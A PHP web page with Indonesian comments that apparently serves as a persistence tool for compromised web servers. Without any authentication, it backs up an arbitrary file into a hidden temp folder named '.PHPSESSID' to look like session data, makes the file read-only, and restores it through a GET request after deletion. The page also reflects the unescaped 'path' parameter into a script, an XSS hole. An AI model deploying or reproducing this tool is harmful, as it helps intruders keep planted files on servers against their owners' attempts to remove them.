<?php

function remdot($filename) {
    return str_replace(".", '', $filename);
}

function get_temp_dir() {
    $tmp_paths = array("/tmp", "/var/tmp");
    foreach ($tmp_paths as $tmp_path) {
        if (is_writable($tmp_path)) {
            return $tmp_path;
        }
    }
    if (function_exists("sys_get_temp_dir")) {
        return sys_get_temp_dir();
    }
    if (!empty($_ENV["TMP"])) {
        return realpath($_ENV["TMP"]);
    } elseif (!empty($_ENV["TMPDIR"])) {
        return realpath($_ENV["TMPDIR"]);
    } elseif (!empty($_ENV["TEMP"])) {
        return realpath($_ENV["TEMP"]);
    }
    $tempfile = tempnam(sys_get_temp_dir(), '');
    if ($tempfile) {
        unlink($tempfile);
        return realpath(dirname($tempfile));
    }
    return false;
}

function set_file_immutable($filename) {
    // Lock file menggunakan chmod
    if (file_exists($filename)) {
        chmod($filename, 0444); // Set permission read-only
    }
}

function unset_file_immutable($filename) {
    // Unlock file menggunakan chmod
    if (file_exists($filename)) {
        chmod($filename, 0644); // Set permission writable kembali
    }
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $namafilelos = $_POST["lockfile"];
    $tmpnya = get_temp_dir();
    $path = isset($_GET['path']) ? $_GET['path'] : getcwd();

    $cachedirectorylo = $tmpnya . "/.PHPSESSID";
    if (!file_exists($cachedirectorylo)) {
        mkdir($cachedirectorylo);
    }

    $backupFile = $cachedirectorylo . "/" . base64_encode(getcwd() . remdot($namafilelos) . "-backup");
    $permissionFile = $cachedirectorylo . "/" . base64_encode(getcwd() . remdot($namafilelos) . "-perm");

    if (isset($_POST["lock"])) { 
        // Lock file logic
        if (!file_exists($backupFile)) {
            // Backup file content and permissions
            copy($namafilelos, $backupFile);
            file_put_contents($permissionFile, substr(sprintf('%o', fileperms($namafilelos)), -4));
        }

        // Set file to read-only
        set_file_immutable($namafilelos);
        echo "<script>alert('File locked successfully!'); window.location='?path={$path}';</script>";
    } elseif (isset($_POST["unlock"])) { 
        // Unlock file logic
        if (file_exists($backupFile)) {
            unset_file_immutable($namafilelos); // Unlock file
            // Restore file content
            copy($backupFile, $namafilelos);

            // Restore permissions
            if (file_exists($permissionFile)) {
                $originalPerm = file_get_contents($permissionFile);
                chmod($namafilelos, octdec($originalPerm));
            } else {
                chmod($namafilelos, 0644); // Default if permission backup not found
            }

            unlink($backupFile); // Delete backup
            unlink($permissionFile); // Delete permission file
            echo "<script>alert('File unlocked successfully!'); window.location='?path={$path}';</script>";
        } else {
            echo "<script>alert('ERROR! Backup file not found.'); window.location='?path={$path}';</script>";
        }
    }
}

// Auto-restore mechanism
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET["restore"]) && isset($_GET["file"])) {
    $namafilelos = $_GET["file"];
    $tmpnya = get_temp_dir();

    $cachedirectorylo = $tmpnya . "/.PHPSESSID";
    $backupFile = $cachedirectorylo . "/" . base64_encode(getcwd() . remdot($namafilelos) . "-backup");
    $permissionFile = $cachedirectorylo . "/" . base64_encode(getcwd() . remdot($namafilelos) . "-perm");

    if (!file_exists($namafilelos) && file_exists($backupFile)) {
        // Restore file content
        copy($backupFile, $namafilelos);

        // Restore permissions
        if (file_exists($permissionFile)) {
            $originalPerm = file_get_contents($permissionFile);
            chmod($namafilelos, octdec($originalPerm));
        } else {
            chmod($namafilelos, 0644); // Default if permission backup not found
        }

        echo "<script>alert('File restored successfully!'); window.location='?path=" . getcwd() . "';</script>";
    } else {
        echo "<script>alert('ERROR! File cannot be restored.'); window.location='?path=" . getcwd() . "';</script>";
    }
}

?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lock & Unlock File</title>
</head>
<body>
    <div class="container">
        <h1>Lock & Unlock File</h1>
        <form method="post" action="">
            <input type="text" name="lockfile" placeholder="Nama file" required>
            <div>
                <input type="submit" name="lock" value="Lock File">
                <input type="submit" name="unlock" value="Unlock File">
            </div>
        </form>
    </div>
</body>
</html>
